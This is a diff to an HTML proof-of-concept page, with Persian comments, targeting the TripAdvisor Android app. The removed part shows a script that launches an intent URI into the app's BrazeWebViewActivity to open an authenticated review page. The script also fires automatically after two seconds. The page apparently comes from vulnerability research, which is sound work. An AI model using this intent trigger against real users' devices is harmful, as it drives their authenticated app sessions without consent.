@@ -3,28 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TripAdvisor Remote Critical PoC</title>
+    <title>TripAdvisor Remote Critical PoC - v2</title>
     <style>
-        body { font-family: system-ui; text-align: center; padding: 50px; background: #111; color: #0f0; }
-        button { font-size: 22px; padding: 20px 40px; background: #f00; color: white; border: none; border-radius: 12px; cursor: pointer; }
+        body { font-family: system-ui; text-align: center; padding: 40px; background: #111; color: #0f0; }
+        button { font-size: 22px; padding: 18px 40px; margin: 15px; background: #f00; color: white; border: none; border-radius: 12px; cursor: pointer; }
+        .fallback { background: #0a0; }
     </style>
 </head>
 <body>
-    <h1>🚨 TripAdvisor Remote Critical PoC</h1>
-    <p>کلیک کن تا صفحه Review (authenticated) در TripAdvisor باز شود</p>
-    <button onclick="triggerIntent()">Open in TripAdvisor</button>
-
-    <script>
-        function triggerIntent() {
-            window.location = "intent:#Intent;component=com.tripadvisor.tripadvisor/com.braze.ui.BrazeWebViewActivity;S.url=https://www.tripadvisor.com/UserReview;end";
-        }
-
-        // بعد از ۲ ثانیه به طور خودکار اجرا شود (برای PoC قوی‌تر)
-        setTimeout(triggerIntent, 2000);
-    </script>
-
-
-    
     <h1>🚨 TripAdvisor Remote Critical PoC v2</h1>
     <p>کلیک کن تا صفحه Review (authenticated) در TripAdvisor باز شود</p>
 
@@ -47,7 +33,3 @@
     </script>
 </body>
 </html>
-
-
-<!DOCTYPE html>
-
